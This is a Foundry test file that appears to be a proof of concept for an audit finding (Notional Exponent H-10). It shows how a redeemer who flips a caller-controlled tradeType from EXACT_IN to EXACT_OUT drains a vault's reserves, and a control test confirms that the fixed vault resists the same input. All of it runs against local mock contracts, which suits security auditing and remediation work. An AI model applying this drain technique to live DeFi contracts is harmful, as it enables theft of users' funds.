// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    DEX,
    YieldVault,
    YieldVaultFixed,
    TradeParams,
    TradeType
} from "./62491-h-10-malicious-user-can-change-the-tradetype-to-steal-funds.sol";

// Notional Exponent H-10: _executeRedemptionTrades builds the Trade with the
// caller-controlled tradeType. Flipping EXACT_IN → EXACT_OUT reinterprets the
// exit balance as an asset OUTPUT amount, draining the vault's reserves to the
// redeemer.
contract PoC_62491_TradeTypeFlip is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant PRICE = 100e18;
    uint256 internal constant EXIT_BALANCE = 1000e18;

    function test_exploit_exactOutFlip_drainsVault() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken asset = e.asset();

        // Honest EXACT_IN would return 10 asset; the EXACT_OUT flip returns 1000.
        assertEq(e.fairOut(), 10 ether, "fair EXACT_IN yield");
        assertEq(e.exploitOut(), 1000 ether, "EXACT_OUT flip yield");
        assertEq(e.vaultSellDrained(), 100_000 ether, "vault sellToken (DAI) drained");
        assertEq(asset.balanceOf(ATTACKER), 1000 ether, "attacker walks away with 1000 asset");

        emit log_named_decimal_uint("fair EXACT_IN asset out ", e.fairOut(), 18);
        emit log_named_decimal_uint("EXACT_OUT flip asset out", e.exploitOut(), 18);
        emit log_named_decimal_uint("vault DAI drained       ", e.vaultSellDrained(), 18);

        // 100x more asset than fair, funded by draining the vault's reserves.
        assertGt(e.exploitOut(), e.fairOut() * 50, "flip extracts >>50x the fair amount");
    }

    // Control: the fixed vault hardcodes EXACT_IN_SINGLE, so the same malicious
    // redemptionTrades params yield only the fair 10 asset and drain 1000 DAI.
    function test_control_fixedVault_exactInOnly() public {
        MiniToken sell = new MiniToken("DAI");
        MiniToken asset = new MiniToken("WBTC");
        DEX dex = new DEX(sell, asset, PRICE);
        YieldVaultFixed vault = new YieldVaultFixed(asset, sell, dex);

        sell.mint(address(vault), 100_000 ether);
        asset.mint(address(dex), 2000 ether);

        MiniToken[] memory tokens = new MiniToken[](1);
        tokens[0] = sell;
        uint256[] memory exitBalances = new uint256[](1);
        exitBalances[0] = EXIT_BALANCE;
        TradeParams[] memory trades = new TradeParams[](1);
        trades[0] = TradeParams({
            tradeType: TradeType.EXACT_OUT_SINGLE, // attacker still tries the flip
            minPurchaseAmount: type(uint256).max,
            dexId: 0,
            exchangeData: ""
        });

        uint256 out = vault.executeRedemption(tokens, exitBalances, trades);
        emit log_named_decimal_uint("fixed vault asset out", out, 18);

        // The fix ignores the attacker's tradeType and sells exactly the exit balance.
        assertEq(out, 10 ether, "fixed vault yields only the fair EXACT_IN amount");
        assertEq(sell.balanceOf(address(vault)), 99_000 ether, "fixed vault only spent the 1000 DAI exit balance");
    }
}
